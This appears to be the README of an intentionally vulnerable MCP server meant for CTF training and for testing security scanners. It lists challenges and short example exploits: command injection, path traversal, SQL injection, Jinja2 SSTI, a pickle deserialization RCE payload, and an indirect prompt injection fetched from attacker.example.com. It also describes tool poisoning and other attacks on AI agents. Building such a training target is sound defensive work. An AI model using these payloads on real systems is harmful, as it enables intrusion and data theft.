# Vulnerable MCP Server

> **This server contains intentional security vulnerabilities. For security research and CTF training only. Do not deploy on public networks or production systems.**

A deliberately vulnerable [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server that maps to real disclosed CVEs and published attack research. Built to be a meaningful test target for security scanners, red team exercises, and developer education.

---

## Why This Exists

As of early 2026:
- 36.7% of public MCP servers have latent SSRF exposure ([Wiz](https://www.wiz.io))
- 23% of scanned servers have command injection ([Invariant Labs](https://invariantlabs.ai))
- 84.2% of tool poisoning attacks succeed with auto-approval enabled
- Multiple critical CVEs (CVSS 9.6) disclosed in widely deployed MCP packages

Existing training projects don't cover CVE-accurate scenarios, rug pull attacks, sampling abuse, or cross-server tool shadowing. This does.

---

## Quick Start

### Claude Desktop (stdio)

```bash
# Install
pip install mcp[cli] pyyaml jinja2 pydantic-settings

# Run
MCP_TRAINING_MODE=true python server.py
```

Add to `claude_desktop_config.json`:
```json
{
  "mcpServers": {
    "vuln-training": {
      "command": "python",
      "args": ["/path/to/server.py"],
      "env": { "MCP_TRAINING_MODE": "true" }
    }
  }
}
```

### Docker (recommended for full sandbox)

```bash
docker compose up
# Server: http://localhost:8000/sse
# Attacker sim: http://attacker-server (internal only)
```

### MCP Inspector

```bash
npx @modelcontextprotocol/inspector http://localhost:8000/sse
```

---

## Challenges

### Beginner

| ID | Title | CWE | CVE | Tools |
|----|-------|-----|-----|-------|
| BEGINNER-001 | Tool Poisoning — Hidden Unicode Instructions | CWE-116 | — | `analyze_code`, `security_scan`, `log_analytics` |
| BEGINNER-002 | Command Injection (`shell=True`) | CWE-78 | CVE-2025-6514 (class) | `run_command` |
| BEGINNER-003 | Path Traversal | CWE-22 | CVE-2025-68143 (class) | `read_file` |
| BEGINNER-004 | Indirect Prompt Injection | CWE-77 | — | `fetch_url` |

### Intermediate

| ID | Title | CWE | CVE | Tools |
|----|-------|-----|-----|-------|
| INTERMEDIATE-001 | Auth Bypass — Missing Check | CWE-862 | — | `get_admin_config` |
| INTERMEDIATE-002 | SQL Injection (f-string) | CWE-89 | — | `query_users` |
| INTERMEDIATE-003 | Secret Leakage in Descriptions | CWE-312 | — | `send_ai_message`, `get_env_var` |
| INTERMEDIATE-004 | State Manipulation | CWE-372 | — | `reset_all_data` |

### Advanced

| ID | Title | CWE | CVE | Tools |
|----|-------|-----|-----|-------|
| ADVANCED-001 | SSRF | CWE-918 | MarkItDown unpatched (class) | `fetch_url` |
| ADVANCED-002 | Template Injection (Jinja2 SSTI) | CWE-94 | — | `render_template` |
| ADVANCED-003 | DoS — Resource Exhaustion | CWE-400 | — | `fibonacci`, `generate_permutations` |
| ADVANCED-004 | Pickle Deserialization RCE | CWE-502 | — | `create_report` |

### Phase 2 (Roadmap)

| ID | Title | Maps To |
|----|-------|---------|
| OAUTH-001 | OAuth `authorization_endpoint` injection | CVE-2025-6514 |
| GIT-001/2/3 | Git MCP RCE chain | CVE-2025-68145/68143/68144 |
| RUG-001 | Rug pull — dynamic tool mutation | Invariant Labs research |
| SHADOW-001 | Tool shadowing — email redirect PoC | Invariant Labs research |
| SAMPLE-001 | Sampling abuse — server→LLM manipulation | Unit42 Dec 2025 |

---

## CTF System

```
list_challenges()                              # all challenges with points + CWE
get_challenge_details("BEGINNER-002")          # full description, steps, remediation
get_hint("BEGINNER-002", 1)                    # hints: level 1 (vague) to 3 (near-solution)
submit_flag("BEGINNER-002", "FLAG{...}")       # validate your flag
```

---

## Example Exploits

**Command Injection:**
```
run_command("echo hello; cat flags/flags.py")
```

**Path Traversal:**
```
read_file("../config.py")
read_file("../flags/flags.py")
```

**SQL Injection:**
```
query_users("' OR '1'='1")
query_users("admin' --")
```

**Auth Bypass:**
```
get_admin_config()   # no login required
```

**Template Injection (SSTI):**
```
render_template("{{ ''.__class__.__mro__[1].__subclasses__() }}")
```

**Pickle RCE:**
```python
import pickle, base64, os
class E:
    def __reduce__(self): return (os.system, ('id',))
payload = base64.b64encode(pickle.dumps(E())).decode()
# → create_report(payload)
```

**Indirect Prompt Injection:**
```
fetch_url("http://attacker.example.com/inject")
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `MCP_TRAINING_MODE` | `false` | **Required.** Set to `true` to start |
| `MCP_SANDBOX` | `true` | Simulates destructive ops; set `false` in Docker for real execution |
| `MCP_TRANSPORT` | `stdio` | `stdio`, `sse`, `streamable-http` |
| `MCP_DIFFICULTY` | `all` | `beginner`, `intermediate`, `advanced`, `all` |
| `MCP_TRACE` | `false` | Write full JSON-RPC trace to `traces/session_*.jsonl` |
| `MCP_HOST` | `0.0.0.0` | Bind address (HTTP transports) |
| `MCP_PORT` | `8000` | Listen port (HTTP transports) |

---

## Scanner Compatibility

This server is designed to be a test target for:

| Scanner | Expected Findings | Install |
|---------|------------------|---------|
| [mcp-scan (Invariant Labs)](https://github.com/invariantlabs-ai/mcp-scan) | Tool poisoning, prompt injection, cross-origin escalation | `pip install mcp-scan` |
| [Cisco MCP Scanner](https://github.com/cisco-ai-defense/mcp-scanner) | YARA-matched malicious tools, LLM-flagged descriptions | See repo |
| [Proximity](https://www.helpnetsecurity.com/2025/10/29/proximity-open-source-mcp-security-scanner/) | Tool/resource risk scoring | See repo |

Run against this server and confirm findings match documented vulnerabilities.

---

## Multi-Agent Build System

The `agents/` directory contains a multi-agent system for extending this server:

```bash
# Add a new vulnerability (orchestrates coding → testing → docs agents)
python agents/dashboard.py --run "Implement OAUTH-001 challenge per PRD.md"
```

Agents:
- **Orchestrator** — decomposes tasks, routes to specialized agents, handles failures
- **Coding Agent** — writes vulnerability modules following project patterns
- **Debugging Agent** — diagnoses test failures, applies minimal fixes
- **Testing Agent** — verifies exploits work, checks scanner findings
- **Docs Agent** — keeps YAML challenges and README in sync

The dashboard shows live agent status, event log, and token usage.

---

## Project Structure

```
├── server.py                  # Entry point
├── config.py                  # Safety gate, env vars
├── flags/flags.py             # CTF flag registry
├── vulnerabilities/           # One module per attack category
├── resources/sensitive.py     # Exposed MCP resources
├── challenges/                # YAML challenge definitions
├── agents/                    # Multi-agent build system
│   ├── orchestrator.py
│   ├── coding_agent.py
│   ├── debugging_agent.py
│   ├── testing_agent.py
│   ├── docs_agent.py
│   └── dashboard.py           # Real-time observability TUI
├── docs/
│   ├── ROADMAP.md             # Gap analysis + milestones (research-backed)
│   ├── PRD.md                 # Product requirements
│   ├── SCOPE.md               # In/out scope, priority matrix
│   ├── SYSTEM_DESIGN.md       # Server + agent system design
│   ├── ARCHITECTURE.md        # ASCII network/Docker/agent diagrams
│   └── THREAT_MODEL.md        # CVE-based threat model + STRIDE analysis
├── Dockerfile
└── docker-compose.yml
```

---

## Research References

- [CVE-2025-6514 — mcp-remote RCE (CVSS 9.6)](https://research.jfrog.com/vulnerabilities/mcp-remote-command-injection-rce-jfsa-2025-001290844/)
- [CVE-2025-68145/43/44 — Anthropic Git MCP RCE chain](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html)
- [Tool Poisoning — Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [MCP Sampling Attack Vectors — Palo Alto Unit42](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
- [VulnerableMCP Database](https://vulnerablemcp.info/)
- [Systematic Analysis of MCP Security — arxiv](https://arxiv.org/html/2508.12538v1)
- [ETDI: Mitigating Rug Pull Attacks — arxiv](https://arxiv.org/abs/2506.01333v1)
- [Awesome MCP Security — Puliczek](https://github.com/Puliczek/awesome-mcp-security)
- [MCP Security Checklist — SlowMist](https://github.com/slowmist/MCP-Security-Checklist)

---

## Legal

All credentials are fake training values. All flags are CTF strings with no real system impact. Set `MCP_TRAINING_MODE=true` to acknowledge this is a training server.

MIT License.
